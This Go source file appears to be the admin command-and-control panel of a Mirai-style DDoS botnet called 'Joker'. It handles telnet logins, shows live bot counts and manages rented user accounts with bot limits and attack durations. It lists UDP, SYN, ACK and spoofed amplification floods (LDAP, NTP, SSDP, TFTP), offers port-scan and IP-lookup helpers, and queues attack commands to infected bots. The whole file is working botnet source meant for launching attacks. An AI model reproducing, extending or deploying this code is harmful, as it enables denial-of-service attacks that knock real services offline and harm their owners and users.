package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
	"net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;92mUsername\033[95m: \033[95m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;92mPassword\033[35m: \033[95m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[95mVerifying... \033[0;92m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[95;1Wrong Shit\r\n"))
        this.conn.Write([]byte("\033[0;31Ur ip Was logged! (any key to exit)\033[95m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[95m"))
    this.conn.Write([]byte("\033[95m[+] DDOS \033[97m| \033[95mSuccesfully hijacked connection\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[95m[+] DDOS \033[97m| \033[95mMasking connection from utmp+wtmp...\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[95m[+] DDOS \033[97m| \033[95mHiding from netstat...\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\033[95m[+] DDOS \033[97m| \033[95mRemoving all traces of LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Reps |vF| User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[95m                                                                 ╦╔═╗╦╔═╔═╗╦═╗\r\n"))
	this.conn.Write([]byte("\033[95m                                                                 ║║ ║╠╩╗║╣ ╠╦╝\r\n"))
	this.conn.Write([]byte("\033[95m                                                                ╚╝╚═╝╩ ╩╚═╝╩╚═\r\n"))
	this.conn.Write([]byte("\033[37m                                                               We are all clowns\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;92mJoker\033[95m~$ "))
        cmd, err := this.ReadLine(false)
        
        if cmd == "Attack" || cmd == "attack" || cmd == "ATTACK" {
    this.conn.Write([]byte("\033[95m                                      ╔══════════════════════════════╦══════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[95m                                      ║ovh [IP] [TIME] dport=[PORT]  ║  std [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[95m                                      ║nfo [IP] [TIME] dport=[PORT]  ║  udp [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[95m                                      ║tcp [IP] [TIME] dport=[PORT]  ║  syn [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[95m                                      ║ack [IP] [TIME] dport=[PORT]  ║  dns [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[95m                                      ╚════════════╦═════════════════╩══════════════╦═══════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;92m                                                 ║     [+] Soofed Methods [+]     ║\r\n"))               
    this.conn.Write([]byte("\033[0;92m                                                 ║ ldap [IP] [TIME] dport=[PORT]  ║\r\n"))
    this.conn.Write([]byte("\033[0;92m                                                 ║ pmap [IP] [TIME] dport=[PORT]  ║\r\n"))
    this.conn.Write([]byte("\033[0;92m                                                 ║ ssdp [IP] [TIME] dport=[PORT]  ║\r\n"))
    this.conn.Write([]byte("\033[0;92m                                                 ║ tftp [IP] [TIME] dport=[PORT]  ║\r\n"))
    this.conn.Write([]byte("\033[0;92m                                                 ║ ntp  [IP] [TIME] dport=[PORT]  ║\r\n"))
    this.conn.Write([]byte("\033[0;92m                                                 ╚════════════════════════════════╝\r\n"))
            continue
        }
		
		if cmd == "help" || cmd == "Help" || cmd == "HELP" {
            this.conn.Write([]byte("\033[95m ╔═══════════════════════════════════╗                                      \r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95madmin                     ║ \r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95minfo                      ║ \r\n"))
			this.conn.Write([]byte("\033[95m ║ \033[95mTools                     ║ \r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95mattack                    ║ \r\n"))
			this.conn.Write([]byte("\033[95m ║ \033[95mcls                       ║ \r\n"))
            this.conn.Write([]byte("\033[95m ╚═══════════════════════════════════╝                                      \r\n"))
            continue
        }
		if userInfo.admin == 0 && cmd == "admin" {
            this.conn.Write([]byte("\033[95m ║ \033[95mThis Command is Only for ADMINS!  \033[95m║ \r\n"))
            continue
        }
		
		if err != nil || cmd == "TOOLS" || cmd == "TOOL" || cmd == "tool" || cmd == "tools" {
            this.conn.Write([]byte(" \x1b[95m/iplookup   \r\n"))
            this.conn.Write([]byte(" \x1b[95m/portscan   \r\n"))
            this.conn.Write([]byte(" \x1b[95m/traceroute \r\n"))
        
            continue
        }
		
		if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\x1b[95mIP Address\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\x1b[95mIP Address\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
            
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[95mIP Address\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[95mWebsite (Without www.)\x1b[95m: \x1b[95m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[35mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[35mResponse\x1b[95m: \r\n\x1b[95m" + locformatted + "\r\n"))
		}
		      if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[95m ╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95m/addbasic - \033[095mAdd Basic Client    \033[95m║\r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95m/addadmin - \033[095mAdd Admin Client    \033[95m║ \r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95m/remove    - \033[095mRemove User        \033[95m║ \r\n"))
            this.conn.Write([]byte("\033[95m ╚═════════════════════════════════╝  \r\n"))
            continue
        }
		
				if userInfo.admin == 1 && cmd == "server" {
            this.conn.Write([]byte("\033[95m ╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95mbots      - \033[095mShow botcount       \033[95m║\r\n"))
            this.conn.Write([]byte("\033[95m ║ \033[95mcls       - \033[095mClea screen         \033[95m║ \r\n"))
            this.conn.Write([]byte("\033[95m ╚═════════════════════════════════╝  \r\n"))
            continue
        }
		
		if cmd == "info" || cmd == "INFO" || cmd == "Info" {

	this.conn.Write([]byte("\033[95m   Created By: Iotnet\r\n"))
	  this.conn.Write([]byte("\033[95m \r\n"))
	  this.conn.Write([]byte("\033[95m \r\n"))
            continue
        }
		
		
		 if cmd == "cls" || cmd == "clear" || cmd == "c" {
	this.conn.Write([]byte("\033[2J\033[1H"))	
	
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots
		
			if userInfo.admin == 1 && cmd == "/addbasic" {
            this.conn.Write([]byte("\033[95mUsername:\033[95m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mPassword:\033[95m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mBotcount\033[95m(\033[95m-1 for access to all\033[95m)\033[95m:\033[95m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s\033[95m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[95mAttack Duration\033[95m(\033[95m-1 for none\033[95m)\033[95m:\033[95m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s\033[95m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[95mCooldown\033[95m(\033[95m0 for none\033[95m)\033[95m:\033[95m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s\033[95m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[95m- New user info - \r\n- Username - \033[95m" + new_un + "\r\n\033[95m- Password - \033[95m" + new_pw + "\r\n\033[95m- Bots - \033[95m" + max_bots_str + "\r\n\033[95m- Max Duration - \033[95m" + duration_str + "\r\n\033[95m- Cooldown - \033[95m" + cooldown_str + "   \r\n\033[95mContinue? \033[95m(\033[01;32my\033[95m/\033[1;31mn\033[95m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[95m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "/addadmin" {
            this.conn.Write([]byte("\033[95mUsername:\033[95m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mPassword:\033[95m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mBotcount\033[95m(\033[95m-1 for access to all\033[95m)\033[95m:\033[95m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[95mAttack Duration\033[95m(\033[95m-1 for none\033[95m)\033[95m:\033[95m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[95mCooldown\033[95m(\033[95m0 for none\033[95m)\033[95m:\033[95m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[95m- New user info - \r\n- Username - \033[95m" + new_un + "\r\n\033[95m- Password - \033[95m" + new_pw + "\r\n\033[95m- Bots - \033[95m" + max_bots_str + "\r\n\033[95m- Max Duration - \033[95m" + duration_str + "\r\n\033[95m- Cooldown - \033[95m" + cooldown_str + "   \r\n\033[95mContinue? \033[95m(\033[01;32my\033[95m/\033[1;31mn\033[95m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[95m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "/remove" {
            this.conn.Write([]byte("\033[95mUsername: \033[95m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[095mAre You Sure You Want To Remove \033[95m" + rm_un + "?\033[0;31m(\033[0;31my\033[0;31m/\033[1;31mn\033[0;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[95mUser Successfully Removed!\r\n"))
            }
            continue
        }
		
        if userInfo.admin == 1 && cmd == "bots" || cmd == "arch" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s:\t%d\033[95m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[95m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[95m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
